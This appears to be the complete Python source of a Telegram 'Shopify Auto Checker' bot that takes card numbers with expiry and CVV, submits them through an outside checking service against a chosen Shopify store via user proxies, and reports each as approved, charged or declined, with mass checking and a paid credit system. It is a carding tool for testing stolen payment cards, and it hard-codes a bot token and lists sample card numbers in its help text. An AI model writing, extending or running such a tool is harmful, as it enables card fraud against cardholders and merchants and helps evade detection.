import telebot
import requests
import re
import json
import os
import time
import html
from random import randint

BOT_TOKEN = "8394420646:AAHxHboneLEZ16ApKs3SauF05x-GLvYZPF0"  
ADMIN_USER_IDS = ["7237320756"]
SITES_FILE = "saved_shopify_sites.json"
USERS_FILE = "registered_users.json"
CODES_FILE = "redeem_codes.json"
PREMIUM_FILE = "premium_users.json"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxies.json"

bot = telebot.TeleBot(BOT_TOKEN)
last_check_time = {}          
user_check_in_progress = {}   

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

def load_json(file):
    if not os.path.exists(file):
        return {}
    with open(file) as f:
        try:
            data = json.load(f)
            if not isinstance(data, dict):
                return {}
            return data
        except:
            return {}

def get_user(uid):
    users = load_json(USERS_FILE)
    return users.get(str(uid), None)

def save_user(uid, data):
    users = load_json(USERS_FILE)
    users[str(uid)] = data
    save_json(USERS_FILE, users)

def get_premium(uid):
    data = load_json(PREMIUM_FILE)
    return str(uid) in data and data[str(uid)]

def set_premium(uid, val=True):
    data = load_json(PREMIUM_FILE)
    data[str(uid)] = bool(val)
    save_json(PREMIUM_FILE, data)

def is_admin(user_id):
    return str(user_id) in ADMIN_USER_IDS

def is_valid_card(card):
    return bool(re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', card))

def bin_lookup(bin_code):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_code}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("brand", "N/A"),
                "type": data.get("type", "N/A"),
                "level": data.get("level", "N/A"),
                "bank": data.get("bank", "N/A"),
                "country": data.get("country_name", "N/A"),
                "country_emoji": data.get("country_flag", "🏳️")
            }
    except Exception:
        pass
    return {
        "brand": "N/A",
        "type": "N/A",
        "level": "N/A",
        "bank": "N/A",
        "country": "N/A",
        "country_emoji": "🏳️"
    }

def esc(text):
    return html.escape(str(text))

def get_site(user_id):
    sites = load_json(SITES_FILE)
    return sites.get(str(user_id), None)

def set_site(user_id, site):
    sites = load_json(SITES_FILE)
    sites[str(user_id)] = site
    save_json(SITES_FILE, sites)

def get_banned():
    return set(load_json(BANNED_FILE).keys())

def ban_user(username):
    banned = load_json(BANNED_FILE)
    banned[username.lower()] = True
    save_json(BANNED_FILE, banned)

def is_banned(username):
    return username and username.lower() in load_json(BANNED_FILE)

def format_result(card, api_json, user, user_id, elapsed):
    gateway = api_json.get("Gateway", "Shopify Normal")
    status = api_json.get("Status", api_json.get("status", "Unknown"))
    response_msg = api_json.get("Response", api_json.get("response", ""))
    amount_raw = (
        api_json.get("Amount")
        or api_json.get("amount")
        or api_json.get("price")
        or api_json.get("Price")
    )
    try:
        amount_value = float(str(amount_raw).replace("$", "").strip())
        amount = f"${amount_value:.2f}"
    except:
        amount = "N/A"
    bin_code = card.split('|')[0][:6]
    bininfo = bin_lookup(bin_code)

    status_lower = str(status).lower()
    response_lower = str(response_msg).lower()
    declined_phrases = [
        "declined", "card_declined", "authorization_error", "authentication_failed",
        "do_not_honor", "pick_up_card", "pickup_card", "stolen_card", "lost_card", "incorrect_number",
        "expired_card", "processing_error", "fraudulent", "generic_error",
        "fraud_suspected", "invalid_payment_error", "amount_too_small"
    ]
    if any(x in status_lower or x in response_lower for x in declined_phrases):
        status_str = "DECLINED ❌"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "3d", "authentication", "3d secure", "3ds", "otp", "verify", "verification"
    ]):
        status_str = "Approved ❎"
        response_show = response_msg
    elif "insufficient" in response_lower or "low funds" in response_lower:
        status_str = "Approved ❎"
        response_show = response_msg
    elif "incorrect_zip" in response_lower:
        status_str = "Approved ❎"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "incorrect cvc", "invalid cvc", "incorrect cvv", "invalid cvv", "incorrect security code", "invalid security code"
    ]):
        status_str = "Approved ❎"
        response_show = response_msg
    elif any(x in response_lower for x in [
        "thank you", "order placed", "charged", "successfully paid", "payment successful"
    ]):
        status_str = "Charged 🔥"
        response_show = response_msg
    else:
        approved_phrases = ["approved", "charged", "success", "live", "approved!"]
        is_approved = any(p in status_lower for p in approved_phrases)
        status_str = f"{esc(status)} {'✅' if is_approved else '❌'}"
        response_show = response_msg

    link = "https://t.me/mytricksl"
    b = lambda t: f"<b>{t}</b>"
    m = lambda t: f"<code>{t}</code>"
    ks = f'<a href="{link}">ϟ</a>'
    su = f'<a href="{link}">ス</a>'
    curl = f'<a href="{link}">⌯</a>'

    info_str = f"{bininfo['brand']} - {bininfo['type']} - {bininfo['level']}"
    country_str = f"{bininfo['country']} - {bininfo['country_emoji']}"

    text = (
        f"{b('#Auto_Shopify | Awmtee [Self Check]')}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"{b(f'[{ks}] Card:')} {m(card)}\n"
        f"{b(f'[{ks}] Gateway:')} {m(f'{gateway} {amount}')}\n"
        f"{b(f'[{ks}] Status:')} {m(status_str)}\n"
        f"{b(f'[{ks}] Response:')} {m(response_show)}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"{b(f'[{curl}] Bin:')} {m(bin_code)}\n"
        f"{b(f'[{curl}] Info:')} {m(info_str)}\n"
        f"{b(f'[{curl}] Bank:')} {m(bininfo['bank'])}\n"
        f"{b(f'[{curl}] Country:')} {m(country_str)}\n"
        f"━━━━━━━━━━━━━━━\n"
        f'{b(f"[{su}] Checked By:")} <a href="tg://user?id={user_id}">{esc(user)}</a>\n'
        f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=7237320756\">Awmte - ☘️</a>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live 🌥]')}\n"
    )
    return text



@bot.message_handler(commands=['start'])
def start_handler(message):
    username = (message.from_user.username or "").lower()
    if is_banned(username):
        return
    uid = str(message.from_user.id)
    users = load_json(USERS_FILE)
    if uid not in users:
        bot.send_message(
            message.chat.id,
            "👋 Welcome to Awmte Checker!\n\nType /register to use checker.",
            parse_mode="HTML"
        )
    else:
        bot.send_message(
            message.chat.id,
            f"👋 Welcome back, <b>{esc(message.from_user.first_name)}</b>!\nYou have <b>{users[uid]['credits']}</b> credits.",
            parse_mode="HTML"
        )

@bot.message_handler(commands=['register'])
def register_handler(message):
    username = (message.from_user.username or "").lower()
    if is_banned(username):
        return
    uid = str(message.from_user.id)
    users = load_json(USERS_FILE)
    if uid in users:
        bot.reply_to(message, "You are already registered!\nUse /info to check your stats.")
        return
    users[uid] = {
        "credits": 50,
        "first_name": message.from_user.first_name,
        "username": message.from_user.username or "-",
        "registered": int(time.time())
    }
    save_json(USERS_FILE, users)
    bot.reply_to(
        message,
        "✅ Registration successful! You have received <b>50 credits</b>.\nUse /info or .info to view your info.",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['code'])
def code_handler(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ You are not authorized.")
        return
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit():
        bot.reply_to(message, "Usage: /code <amount>\nExample: /code 100")
        return
    amount = int(args[1])
    code = "".join([str(randint(0, 9)) for _ in range(10)])
    codes = load_json(CODES_FILE)
    codes[code] = {"used": False, "credits": amount}
    save_json(CODES_FILE, codes)
    bot.reply_to(message, f"🎟️ Redeem code for <b>{amount}</b> credits generated:\n<code>{code}</code>", parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def redeem_handler(message):
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /redeem [code]")
        return
    code = args[1].strip()
    codes = load_json(CODES_FILE)
    uid = str(message.from_user.id)
    users = load_json(USERS_FILE)
    if code in codes and not codes[code].get("used"):
        amount = codes[code].get("credits", 0)
        codes[code]["used"] = True
        users.setdefault(uid, {"credits": 0, "first_name": message.from_user.first_name, "username": message.from_user.username or "-", "registered": int(time.time())})
        users[uid]["credits"] += amount
        save_json(CODES_FILE, codes)
        save_json(USERS_FILE, users)
        bot.reply_to(message, f"✅ Redeemed! <b>{amount}</b> credits added.\nCurrent: <b>{users[uid]['credits']}</b> credits.", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Invalid or already used code.")

@bot.message_handler(func=lambda m: m.text and (m.text.lower() in ["/info", ".info"]))
def info_handler(message):
    username = (message.from_user.username or "").lower()
    if is_banned(username):
        return
    uid = str(message.from_user.id)
    user = get_user(uid)
    if not user:
        bot.reply_to(message, "❌ Not registered. Use /register first.")
        return
    is_premium = get_premium(uid)
    try:
        is_tg_premium = message.from_user.is_premium
    except:
        is_tg_premium = False
    msg = f"""<b>👤 User Info</b>
<b>ID:</b> <code>{uid}</code>
<b>Username:</b> @{user.get('username','-')}
<b>Credits:</b> <b>{user.get('credits',0)}</b>
<b>Telegram Premium:</b> {'✅' if is_tg_premium else '❌'}
<b>Bot Premium:</b> {'✅' if is_premium else '❌'}
"""
    bot.reply_to(message, msg, parse_mode="HTML")

@bot.message_handler(commands=['premium'])
def premium_handler(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ You are not authorized.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "Usage: /premium <user_id or @username>")
        return
    target = args[1].strip()
    users = load_json(USERS_FILE)
    uid = None
    if target.startswith("@"):
        uname = target[1:].lower()
        for i, u in users.items():
            if u.get("username","").lower() == uname:
                uid = i
                break
    else:
        if target.isdigit() and target in users:
            uid = target
    if not uid:
        bot.reply_to(message, "User not found!")
        return
    set_premium(uid, True)
    bot.reply_to(message, f"✅ User <code>{uid}</code> now has premium access.", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.lower() in ["/users", ".users"])
def users_handler(message):
    if not is_admin(message.from_user.id):
        return
    users = load_json(USERS_FILE)
    bans = get_banned()
    premiums = load_json(PREMIUM_FILE)
    msg = "<b>👥 Bot Users:</b>\n"
    for uid, data in users.items():
        uname = data.get("username", "-")
        p = "✅" if premiums.get(uid) else "❌"
        ban = "🚫" if uname and uname.lower() in bans else ""
        msg += f"• <b>@{uname}</b> | ID: <code>{uid}</code> | Credits: <b>{data.get('credits',0)}</b> | Premium: <b>{p}</b> {ban}\n"
    bot.reply_to(message, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith("/reset") or m.text.lower().startswith(".reset")))
def reset_handler(message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /reset username")
        return
    username_to_reset = args[1].replace("@","").lower()
    users = load_json(USERS_FILE)
    uid = None
    for k,v in users.items():
        if v.get("username","").lower() == username_to_reset:
            uid = k
            break
    if not uid:
        bot.reply_to(message, "User not found.")
        return
    users[uid]["credits"] = 50
    set_premium(uid, False)
    save_json(USERS_FILE, users)
    bot.reply_to(message, f"User @{username_to_reset} has been reset (50 credits, premium off).")

@bot.message_handler(commands=["ban"])
def ban_handler(message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /ban username")
        return
    username_to_ban = args[1].replace("@","").lower()
    users = load_json(USERS_FILE)
    found = False
    for v in users.values():
        if v.get("username","").lower() == username_to_ban:
            found = True
            break
    if not found:
        bot.reply_to(message, "User not found.")
        return
    ban_user(username_to_ban)
    bot.reply_to(message, f"User @{username_to_ban} has been banned.")

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/slfurl') or m.text.startswith('.slfurl')))
def set_url(message):
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /slfurl [shopify_site_url]")
        return
    url = args[1].strip()
    set_site(message.from_user.id, url)
    bot.reply_to(
        message,
        f"✅ ꜱʜᴏᴘɪꜰʏ ᴜʀʟ ꜱᴇᴛ ᴛᴏ:\n{url}\nʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴜꜱᴇ /ꜱʟꜰ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]."
    )

# ========== Proxy Helpers ==========
def get_proxies():
    return load_json(PROXY_FILE)

def save_proxy(user_id, proxy):
    proxies = load_json(PROXY_FILE)
    proxies[str(user_id)] = proxy
    save_json(PROXY_FILE, proxies)

def get_proxy(user_id):
    proxies = load_json(PROXY_FILE)
    return proxies.get(str(user_id), None)

@bot.message_handler(commands=["addproxy"])
def add_proxy_handler(message):
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /addproxy ip:port:user:pass")
        return
    proxy = args[1].strip()
    uid = str(message.from_user.id)
    save_proxy(uid, proxy)
    bot.reply_to(message, f"✅ Proxy set for you:\n<code>{proxy}</code>", parse_mode="HTML")

# ===========================================

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/slf') or m.text.startswith('.slf')))
def check_card(message):
    uid = str(message.from_user.id)
    username = (message.from_user.username or "").lower()

    if user_check_in_progress.get(uid, False):
        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
        return

    now = time.time()
    last_end = last_check_time.get(uid, 0)
    cooldown = 10
    if now - last_end < cooldown:
        wait_sec = int(cooldown - (now - last_end))
        bot.reply_to(message, f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}s…")
        return

    user_check_in_progress[uid] = True

    user = get_user(uid)
    if not user:
        bot.reply_to(message, "❌ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ʀᴇɢɪꜱᴛᴇʀᴇᴅ. ᴜꜱᴇ /ʀᴇɢɪꜱᴛᴇʀ")
        user_check_in_progress[uid] = False
        return
    if user.get("credits", 0) < 1:
        bot.reply_to(message, "❌ ɴᴏᴛ ᴇɴᴏᴜɢʜ ᴄʀᴇᴅɪᴛꜱ! /ʀᴇᴅᴇᴇᴍ ᴀ ᴄᴏᴅᴇ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ.")
        user_check_in_progress[uid] = False
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ ᴜꜱᴀɢᴇ: /ꜱʟꜰ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]")
        user_check_in_progress[uid] = False
        return
    card = args[1].replace(" ", "")
    if not is_valid_card(card):
        bot.reply_to(message, "❌ ɪɴᴠᴀʟɪᴅ ᴄᴀʀᴅ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
        user_check_in_progress[uid] = False
        return

    shop_url = get_site(message.from_user.id)
    if not shop_url:
        bot.reply_to(message, "⚠️ ᴘʟᴇᴀꜱᴇ ꜱᴇᴛ ʏᴏᴜʀ ꜱʜᴏᴘɪꜰʏ ꜱɪᴛᴇ ꜰɪʀꜱᴛ.ᴇxᴀᴍᴘʟᴇ /ꜱʟꜰᴜʀʟ ᴡᴡᴡ.ᴄʜʜᴀᴘʀɪ.ᴄᴏᴍ")
        user_check_in_progress[uid] = False
        return

    status_msg = bot.reply_to(message, "ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")
    t0 = time.time()
    try:
        api_url = f"https://autoshopify.stormx.pw/index.php?site={shop_url}&cc={card}"

        # try to use user's proxy if set
        proxy_str = get_proxy(uid)
        proxies = None
        if proxy_str:
            try:
                proxy_url = None
                if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
                    proxy_url = proxy_str
                elif "@" in proxy_str:
                    # formats like user:pass@ip:port or user:pass@host:port
                    proxy_url = "http://" + proxy_str if not proxy_str.startswith("http") else proxy_str
                else:
                    parts = proxy_str.split(":")
                    if len(parts) >= 4:
                        # ip:port:user:pass (common in your example)
                        ip = parts[0]
                        port = parts[1]
                        userp = parts[2]
                        pwd = ":".join(parts[3:])  # in case password contains ':'
                        proxy_url = f"http://{userp}:{pwd}@{ip}:{port}"
                    elif len(parts) == 2:
                        ip = parts[0]
                        port = parts[1]
                        proxy_url = f"http://{ip}:{port}"
                    else:
                        proxy_url = proxy_str
                if proxy_url:
                    proxies = {"http": proxy_url, "https": proxy_url}
            except Exception:
                proxies = None

        response = requests.get(api_url, timeout=60, proxies=proxies)
        try:
            api_json = response.json()
        except Exception:
            api_json = {"Response": response.text}
        elapsed = time.time() - t0
        user_display = message.from_user.username or message.from_user.first_name
        result_text = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)

        user["credits"] = user.get("credits", 0) - 1
        save_user(uid, user)

        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(
            telebot.types.InlineKeyboardButton("Plans", url="https://t.me/Awmtee"),
            telebot.types.InlineKeyboardButton("Updates", url="https://t.me/awmteee")
        )
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=result_text,
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=markup
        )
    except Exception as e:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            text=f"Error: {e}"
        )
    user_check_in_progress[uid] = False
    last_check_time[uid] = time.time()


@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/mslf') or m.text.startswith('.mslf')))
def mass_check(message):
    uid = str(message.from_user.id)
    username = (message.from_user.username or "").lower()

    if user_check_in_progress.get(uid, False):
        bot.reply_to(message, "⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
        return

    now = time.time()
    last_end = last_check_time.get(uid, 0)
    cooldown = 10
    if now - last_end < cooldown:
        wait_sec = int(cooldown - (now - last_end))
        bot.reply_to(message, f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}ꜱ…")
        return

    user_check_in_progress[uid] = True

    user = get_user(uid)
    if not user:
        bot.reply_to(message, "❌ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ʀᴇɢɪꜱᴛᴇʀᴅ. ᴜꜱᴇ /ʀᴇɢɪꜱᴛᴇʀ")
        user_check_in_progress[uid] = False
        return
    if not get_premium(uid):
        bot.reply_to(message, "❌ ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ ᴄᴀɴ ᴜꜱᴇ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ.")
        user_check_in_progress[uid] = False
        return
    if user.get("credits", 0) < 1:
        bot.reply_to(message, "❌ ɴᴏᴛ ᴇɴᴏᴜɢʜ ᴄʀᴇᴅɪᴛꜱ! /ʀᴇᴅᴇᴇᴍ ᴀ ᴄᴏᴅᴇ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ.")
        user_check_in_progress[uid] = False
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: /mslf [cc|mm|yy|cvv] ...")
        user_check_in_progress[uid] = False
        return
    cards = re.findall(r'(\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', args[1].replace('\n', ' '))
    if not cards:
        bot.reply_to(message, "❌ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ.")
        user_check_in_progress[uid] = False
        return
    if len(cards) > 10:
        bot.reply_to(message, "❌ /ᴍꜱʟꜰ ᴄʜᴇᴄᴋ ʟɪᴍɪᴛ ɪꜱ 10 ᴄᴀʀᴅꜱ.")
        cards = cards[:10]

    shop_url = get_site(message.from_user.id)
    if not shop_url:
        bot.reply_to(message, "⚠️ ᴘʟᴇᴀꜱᴇ ꜱᴇᴛ ʏᴏᴜʀ ꜱʜᴏᴘɪꜰʏ ꜱɪᴛᴇ ꜰɪʀꜱᴛ.ᴇxᴀᴍᴘʟᴇ /ꜱʟꜰᴜʀʟ ᴡᴡᴡ.ᴄʜʜᴀᴘʀɪ.ᴄᴏᴍ")
        user_check_in_progress[uid] = False
        return

    bot.reply_to(message, "ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")

    for idx, card in enumerate(cards, 1):
        if user["credits"] < 1:
            bot.send_message(
                message.chat.id,
                "<b>❌ 𝐍𝐨𝐭 𝐞𝐧𝐨𝐮𝐠𝐡 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐜𝐡𝐞𝐜𝐤𝐬.</b>",
                parse_mode="HTML"
            )
            break
        t0 = time.time()
        try:
            api_url = f"https://autoshopify.stormx.pw/index.php?site={shop_url}&cc={card}"

            # try to use user's proxy if set
            proxy_str = get_proxy(uid)
            proxies = None
            if proxy_str:
                try:
                    proxy_url = None
                    if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
                        proxy_url = proxy_str
                    elif "@" in proxy_str:
                        proxy_url = "http://" + proxy_str if not proxy_str.startswith("http") else proxy_str
                    else:
                        parts = proxy_str.split(":")
                        if len(parts) >= 4:
                            ip = parts[0]
                            port = parts[1]
                            userp = parts[2]
                            pwd = ":".join(parts[3:])
                            proxy_url = f"http://{userp}:{pwd}@{ip}:{port}"
                        elif len(parts) == 2:
                            ip = parts[0]
                            port = parts[1]
                            proxy_url = f"http://{ip}:{port}"
                        else:
                            proxy_url = proxy_str
                    if proxy_url:
                        proxies = {"http": proxy_url, "https": proxy_url}
                except Exception:
                    proxies = None

            response = requests.get(api_url, timeout=60, proxies=proxies)
            try:
                api_json = response.json()
            except Exception:
                api_json = {"Response": response.text}
            elapsed = time.time() - t0
            user_display = message.from_user.username or message.from_user.first_name
            result_box = format_result(card, api_json, user=user_display, user_id=message.from_user.id, elapsed=elapsed)
        except Exception as e:
            result_box = f"<b>{card}</b>\nError: {esc(e)}"
        user["credits"] -= 1
        save_user(uid, user)

        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(
            telebot.types.InlineKeyboardButton("Plans", url="https://t.me/Awmtee"),
            telebot.types.InlineKeyboardButton("Updates", url="https://t.me/awmteee")
        )
        try:
            bot.send_message(
                message.chat.id,
                result_box + f"\n<b>Checked: {idx}/{len(cards)}</b>",
                parse_mode="HTML",
                disable_web_page_preview=True,
                reply_markup=markup
            )
        except Exception as ex:
            bot.send_message(
                message.chat.id,
                f"Error displaying result: {ex}",
                parse_mode="HTML"
            )
        time.sleep(1)

    user_check_in_progress[uid] = False
    last_check_time[uid] = time.time()

@bot.message_handler(commands=["help"])
def help_handler(message):
    bot.reply_to(
        message,
        "🛒 <b>Shopify Auto Checker Bot</b>\n\n"
        "1. Set site:\n"
        "/slfurl [shopify_site_url] or .slfurl [shopify_site_url]\n"
        "2. Check card:\n"
        "/slf [cc|mm|yy|cvv] or .slf [cc|mm|yy|cvv]\n"
        "3. Mass check:\n"
        "/mslf [cc|mm|yy|cvv] [card2] ... or .mslf [card1 card2 ...]\n\n"
        "Admin commands: /id /users /reset /code /ban /premium\n"
        "User commands: /redeem /register /info\n"
        "Example:\n"
        ".mslf 4788399994032049|07|2027|664 4788399994499834|09|2028|120\n"
        "/mslf 4788399994865471|09|2028|524",
        parse_mode="HTML"
    )

print("Bot running...")
bot.infinity_polling(skip_pending=True)
